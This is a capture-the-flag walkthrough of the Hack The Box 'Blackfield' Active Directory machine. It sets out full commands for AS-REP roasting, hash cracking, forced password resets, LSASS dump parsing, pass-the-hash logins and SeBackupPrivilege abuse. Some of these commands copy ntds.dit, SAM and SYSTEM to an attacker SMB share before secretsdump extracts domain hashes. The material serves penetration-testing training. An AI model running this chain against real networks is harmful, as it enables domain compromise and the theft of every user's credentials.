# Blackfield

# HTB - Blackfield (Windows / Hard)

## Machine Info

- OS: Windows
- Difficulty: Hard
- IP: 10.129.229.17
- Topics: AD, SeBackupPrivilege, NTDS extraction

## Summary

### What was the machine about?

This machine focuses on Active Directory attack techniques and helps to sharpen skills in SMB enumeration, AS-REP attacks, LSASS dump analysis, and SeBackupPrivilege exploitation.

### What was the core attack chain?

The core attack chain is:

SMB → Enumerate Users → AS-REP Attack on Found Users → Hash Cracking → Reading LSASS.dump → Chaining attack from info obtained in LSASS → Privilege Escalation using SeBackupPrivilege

## Enumeration

### Nmap

```cpp
nmap -sC -sV -oN Blackfield.nmap 10.129.229.17
```

The scan reveals some ports open:

53 DNS, 88 Kerberos, 389 LDAP, 445 SMB and 5985 WinRM. 

Additionally it reveals, it is a domain controller and domain name is BLACKFIELD.local.

![image.png](../Assets/Blackfield/image.png)

### SMB Enumeration

Firstly, let’s enumerate SMB to find out if any shares are accessible.

Found `profiles$` share with read access. Unfortunately, no files were found, but the interesting thing is each folder is named after a username. So technically, we got a bunch of usernames.

```cpp
smbmap -u guest -H 10.129.229.17
```

![image.png](../Assets/Blackfield/image%201.png)

Let's mount the share to analyze its contents:

```cpp
sudo mount -t cifs '//10.129.229.17/profiles$' /mnt/data
```

The `profiles$` share exposes usernames → useful for Kerberos attacks.

Kerberos without pre-auth → AS-REP roastable accounts.

Now list out the folders, filter the usernames using awk, and save them to a text file.

![image.png](../Assets/Blackfield/image%202.png)

### User Validation

Let’s validate the users we listed:

```cpp
kerbrute userenum --dc 10.129.229.17 -d BLACKFIELD.local clean_users.txt
```

Since Kerberos port is open let’s try the AS-REP to see any Kerberos pre-authentication disabled user is available.

```cpp
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.129.229.17
```

![image.png](../Assets/Blackfield/image%203.png)

## Password Cracking

Crack the password using hashcat or john

```cpp
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

```cpp
john hash --format=krb5asrep
```

or

```cpp
john hash --wordlist=/usr/share/wordlist/rockyou.txt
```

![image.png](../Assets/Blackfield/image%204.png)

![image.png](../Assets/Blackfield/image%205.png)

![image.png](../Assets/Blackfield/image%206.png)

## Foothold

We got the credentials. Let’s validate and verify using CrackMapExec.

The credentials are valid, but they are not in the Remote Management group to get a WinRM shell or the Remote Users group to get an SMB shell.

Also tried accessing shares with valid credentials, but found nothing interesting.

So let’s move to another technique. As we have valid credentials and the domain name, we can run BloodHound:

```cpp
bloodhound-python -u 'support' -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c all
```

Upload these BloodHound result files and run Cypher queries.

No interesting attack path was found initially, but the shortest path from the owned object revealed a new path.

![image.png](../Assets/Blackfield/image%207.png)

ACL (ForceChangePassword) can be used to change the password of the `audit2020` user:

```cpp
rpcclient -U support 10.129.229.17
rpcclient $> setuserinfo2 Audit2020 23 'audit@2026'
```

Now let’s confirm whether the `audit2020` user is accessible after the password change using CrackMapExec.

SMB and WinRM credentials worked, but no shell access was obtained.

Let’s go back to share enumeration.

Interestingly, we got another share with read access:

```
forensic
```

![image.png](../Assets/Blackfield/image%208.png)

## LSASS Dump

Mount the drive:

```cpp
sudo mount -t cifs '//10.129.229.17/forensic' /mnt/data1
find . -type f
```

Found a useful file: LSASS memory dump.

LSASS (Local Security Authority Subsystem Service) stores credentials in memory such as NT hash, LM hash, and Kerberos keys.

Extract the zip file and analyze:

```cpp
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

We found two user accounts (`administrator`, `svc_backup`) and a machine account (`DC01$`).

![image.png](../Assets/Blackfield/image%209.png)

## Access via svc_backup

Let’s try these accounts.

The administrator account didn’t work, but `svc_backup` worked.

```cpp
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![image.png](../Assets/Blackfield/image%2010.png)

## Privilege Escalation

### SeBackupPrivilege

This account has `SeBackupPrivilege`.

This allows bypassing file ACLs because backup APIs ignore NTFS permissions.

We can dump SAM and SYSTEM files:

```cpp
copy sam \\10.10.14.64\share\sam

copy system \\10.10.14.64\share\system
```

But since it is a domain controller, domain hashes are stored in `ntds.dit`.

NTDS.dit = Active Directory database (contains all domain credential hashes)

## Method 1: Shadow Copy & NTDS Extraction

**Create diskshadow script:**

```cpp
vi diskshadow.txt
```

```markdown
set context persistent nowriters
add volume c: alias tmp
create
expose %tmp% h:
```

**Script line-by-line explanation:**

- **set context persistent nowriters** – (Create a persistent shadow copy that survives reboots, excluding VSS writers (faster).)
- **add volume c: alias tmp** (Add the C: volume to the shadow set and alias the resulting snapshot as ‘tmp’.)
- **create** – Create the shadow copy.
- **expose %tmp% h:** – Mount the snapshot as drive H: so it is accessible as a normal drive letter.

**Convert to DOS format:**

```cpp
unix2dos diskshadow.txt
```

**Upload file:**

Upload file to windows machine

```cpp
upload diskshadow.txt
```

or Create directly on windows machine:

```markdown
echo "set context  persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

```

![image.png](../Assets/Blackfield/image%2011.png)

using built-in windows tool diskshadow copy the ntds , sam and system file.
The `SYSTEM` registry hive contains the **boot key**, which is required to decrypt password hashes stored inside `ntds.dit`.

**Run:**

```markdown
diskshadow.exe /s c:\temp\diskshadow.txt
```

![image.png](../Assets/Blackfield/image%2012.png)

**Verify:**

verify the files whether files created in z: drive 

```
dir z:\Windows\NTDS
```

**You should see:**

```
ntds.dit
```

### Copy Files:

we can do it in two ways

**1st Way:**

now let’s copy ntds.dit, sam and system using robocopy

```markdown
robocopy /b z:\windows\ntds . ntds.dit
robocopy /b z:\Windows\System32\config . SYSTE
robocopy /b z:\Windows\System32\config . SAM
```

also system registry hive can copy using

```markdown

reg save hklm\system c:\temp\system
reg save hklm\sam c:\temp\sam
```

**2nd Way:**

Using SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll files

Import necessary libraries:

```bash

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Enable and verify `SeBackupPrivilege`:**

```bash

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Access and copy files from restricted directories, for instance:

```bash
Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
Copy-FileSeBackupPrivilege z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

Finally download them

```markdown
download ntds.dit
download system
download sam
```

## Dump Hashes

```markdown
impacket-secretsdump -ntds ntds.dit -system system local
impacket-secretsdump -ntds ntds.dit -system system local -history

```

![image.png](../Assets/Blackfield/image%2013.png)

## Final Access Issue

Using psexec failed to read the file.

![image.png](../Assets/Blackfield/image%2014.png)

and we have another text file - notes.txt. It reveals some information

![image.png](../Assets/Blackfield/image%2015.png)

**Check encryption:**

```cpp
cipher /c root.txt
```

![image.png](../Assets/Blackfield/image%2016.png)

**Check Privilege:**

check the current privilege using whoami, it reveals nt authority\system

```cpp
whoami
```

We have info that only administrator can read the file. 

## Final Solution

**Use:**

- wmiexec
- smbexec

Instead of psexec to authenticate as Administrator.

![image.png](../Assets/Blackfield/image%2017.png)

## What I Learned

- SeBackupPrivilege doesn't give direct shell access — it gives file READ access. The goal is credential extraction via NTDS.dit, not direct escalation.
- LSASS dump analysis can reveal credentials for multiple accounts simultaneously — always check ALL accounts found, not just the obvious ones.
- psexec spawns as NT AUTHORITY\SYSTEM which cannot read EFS-encrypted files. Use wmiexec or smbexec when you need to authenticate as a specific user account.

## What Failed and Why

### Method 2: `wbadmin` Backup Abuse (Troubleshooting Deep Dive)

> **Note:** This method required significant troubleshooting and is **not documented in most official writeups**.
> 

---

### Initial Attempt — Impacket SMB Server

**On Kali**

```bash
sudo impacket-smbserver -smb2support -user test -password test@123 testshare $(pwd)
```

**On Windows**

```bash
net use x: \\10.129.229.17\testshare /user:test test@123
```

### Verification

```bash
x:
# or
dir x:\
```

### Attempting Backup

```bash
wbadmin start backup -backuptarget:\\10.129.229.17\testshare -include:c:\windows\ntds\
echo "Y" | wbadmin start backup -backuptarget:\\10.129.229.17\testshare -include:c:\windows\ntds\
```

### Error

```
Volume format not supported (NTFS/ReFS required)
```

### Root Cause

- `wbadmin` requires an **NTFS or ReFS filesystem**
- Impacket SMB share:
    - Does **not** provide a real NTFS-backed filesystem
    - Fails due to compatibility limitations

---

### Fix — Creating a Real NTFS Filesystem (Kali)

```bash
cd ..
dd if=/dev/zero of=ntfs.disk bs=1024M count=2
sudo losetup -fP ntfs.disk
losetup -a
sudo mkfs.ntfs /dev/loop0
sudo mount /dev/loop0 smb/
mount | grep smb
cd smb/
```

### Another Problem

Even after creating an NTFS filesystem:

- Impacket still fails
- It cannot properly handle NTFS-backed operations required by `wbadmin`

---

### Final Solution — Switch to Samba

Since Impacket cannot handle the required filesystem behavior, we switch to Samba.

---

### Prepare Share Directory

```bash
mkdir -p /home/redreconx/Blackfield/smb/
chmod 777 /home/redreconx/Blackfield/smb/
```

### Configure Samba

```bash
sudo vi /etc/samba/smb.conf
```

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
interfaces = tun0
smb ports = 445
```

```
[Send]
    comment = redreconx
    path = /home/redreconx/blackfield/smb/
    browseable = yes
    read only = no
    guest ok = yes
```

### Restart Service

```bash
systemctl restart smbd
```

### Reconnect from Windows

```bash
net use x: /delete

cd c:\
net use x: \\10.129.229.17\Send
```

### Verification

```bash
cd x:\
mkdir test1
cd test1
mkdir test2
cd test2
```

If this works → the share is valid.

### Actual Attack Execution

```bash
c:
echo "Y" | wbadmin start backup -backuptarget:\\10.129.229.17\Send -include:c:\windows\ntds\
wbadmin get versions
```

### Recovery Phase

```bash
echo Y | wbadmin start recovery -version:10/02/2020-03:51 -itemtype=file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

### Extract Files

```bash
cd \

download ntds.dit

reg save HKLM\SYSTEM C:\system.hive
download system.hive
```

### Dump Credentials (Kali)

```bash
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL -history
```

### Monitoring Backup (Kali)

**While running:**

```bash
echo "Y" | wbadmin start backup -backuptarget:\\10.129.229.17\Send -include:c:\windows\ntds\
```

**Monitor file creation:**

```bash
watch -n 1 'ls -la'
```

### Navigate Backup Structure

```bash
cd WindowsImageBackup/
ls

cd DC01/
ls

cd Backup\ 2020-10-02\ 035110/
ls
```

## Tools Used

- Nmap, smbmap, kerbrute, impacket-GetNPUsers
- hashcat, john
- BloodHound, bloodhound-python
- rpcclient, CrackMapExec
- Evil-WinRM, pypykatz
- diskshadow, robocopy, reg
- impacket-secretsdump, wmiexec

## References

- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
- https://youtu.be/IfCysW0Od8w?si=nJS3aLGxp1yQf42w&t=3893
- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
